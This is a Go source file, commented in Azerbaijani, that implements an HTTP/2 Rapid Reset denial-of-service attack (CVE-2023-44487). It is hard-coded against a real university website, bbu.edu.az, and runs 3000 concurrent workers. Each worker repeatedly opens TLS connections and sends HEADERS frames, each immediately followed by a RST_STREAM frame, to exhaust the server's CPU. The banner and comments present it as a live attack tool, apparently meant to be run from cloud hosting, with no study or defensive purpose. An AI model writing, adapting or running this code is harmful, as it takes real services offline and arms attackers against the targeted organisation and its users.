package main

import (
    "crypto/tls"
    "fmt"
    "net"
    "sync/atomic"
    "time"
)

var (
    target  = "bbu.edu.az:443" // Host və Port
    sni     = "bbu.edu.az"      // TLS SNI
    workers = 3000              // Railway gücü üçün
    resets  uint64
    errors  uint64
)

func main() {
    fmt.Printf("[!!!] HAKAI-DEMON-V5 AKTİVDİR: %s\n", sni)

    for i := 0; i < workers; i++ {
        go func() {
            for {
                attack()
                // Gecikməni minimuma saxlayırıq ki, server nəfəs ala bilməsin
                time.Sleep(10 * time.Millisecond)
            }
        }()
    }

    // Statistik hesabat
    for {
        time.Sleep(5 * time.Second)
        fmt.Printf("[REPORT] Rapid Reset Sent: %d | Fails: %d\n", atomic.LoadUint64(&resets), atomic.LoadUint64(&errors))
    }
}

func attack() {
    cfg := &tls.Config{
        InsecureSkipVerify: true,
        NextProtos:         []string{"h2"},
        ServerName:         sni,
    }

    // Raw TCP bağlantısı qururuq
    conn, err := net.DialTimeout("tcp", target, 5*time.Second)
    if err != nil {
        atomic.AddUint64(&errors, 1)
        return
    }
    defer conn.Close()

    tlsConn := tls.Client(conn, cfg)
    if err := tlsConn.Handshake(); err != nil {
        atomic.AddUint64(&errors, 1)
        return
    }
    defer tlsConn.Close()

    // HTTP/2 Preface & Settings - Serveri real müştəri olduğuna inandırır
    tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
    
    // Sürətli RESET döngüsü (CVE-2023-44487 simulyasiyası)
    // Server saniyədə minlərlə açılıb-qapanan stream emal etməyə çalışarkən CPU kilidlənir
    for i := 0; i < 200; i++ {
        streamID := uint32(2*i + 1)
        
        // HEADERS Frame (İmitasiya olunmuş yüngül sorğu)
        tlsConn.Write([]byte{
            0x00, 0x00, 0x0c, 0x01, 0x05, 
            byte(streamID >> 24), byte(streamID >> 16), byte(streamID >> 8), byte(streamID),
            0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1, 0xe3, 0xc2, 0xe5, 0xf2, 0x3a, 0x6b,
        })

        // DƏRHAL RST_STREAM Frame (RESET Siqnalı)
        tlsConn.Write([]byte{
            0x00, 0x00, 0x04, 0x03, 0x00, 
            byte(streamID >> 24), byte(streamID >> 16), byte(streamID >> 8), byte(streamID),
            0x00, 0x00, 0x00, 0x08,
        })
        
        atomic.AddUint64(&resets, 1)
    }
}
